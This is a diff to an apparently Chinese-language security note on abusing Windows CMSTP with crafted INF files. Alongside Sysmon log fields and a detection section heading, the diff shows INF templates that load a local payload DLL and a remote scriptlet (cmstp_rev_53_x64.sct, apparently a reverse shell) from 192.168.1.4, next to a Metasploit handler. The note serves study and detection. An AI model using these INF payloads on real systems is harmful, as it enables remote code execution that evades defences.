@@ -73,17 +73,17 @@ msf5 exploit(multi/handler) > exploit
 #### inf模板
 
 ```inf
-[version]
-Signature=$chicago$
-AdvancedINF=2.5
-[DefaultInstall_SingleUser]
-UnRegisterOCXs=UnRegisterOCXSection
-[UnRegisterOCXSection]
-C:\payload.dll
-[Strings]
-AppAct = "SOFTWARE\Microsoft\Connection Manager"
-ServiceName="12306Br0"
-ShortSvcName="12306Br0"
+    [version]
+    Signature=$chicago$
+    AdvancedINF=2.5
+    [DefaultInstall_SingleUser]
+    UnRegisterOCXs=UnRegisterOCXSection
+    [UnRegisterOCXSection]
+     C:\payload.dll
+    [Strings]
+    AppAct = "SOFTWARE\Microsoft\Connection Manager"
+    ServiceName="12306Br0"
+    ShortSvcName="12306Br0"
 ```
 
 INF文件的RegisterOCXSection需要包含恶意DLL文件的本地路径或远程执行的WebDAV位置
@@ -122,6 +122,22 @@ ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}
 ParentProcessId: 1988
 ParentImage: C:\Windows\System32\cmd.exe
 ParentCommandLine: "C:\Windows\System32\cmd.exe"
+```
+
+## inf文件内容
+
+```inf
+    [version]
+    Signature=$chicago$
+    AdvancedINF=2.5
+    [DefaultInstall_SingleUser]
+    UnRegisterOCXs=UnRegisterOCXSection
+    [UnRegisterOCXSection]
+    %11%\scrobj.dll,NI,http://192.168.1.4/cmstp_rev_53_x64.sct
+    [Strings]
+    AppAct = "SOFTWARE\Microsoft\Connection Manager"
+    ServiceName="Micropoor"
+    ShortSvcName="Micropoor"
 ```
 
 ## 检测规则/思路
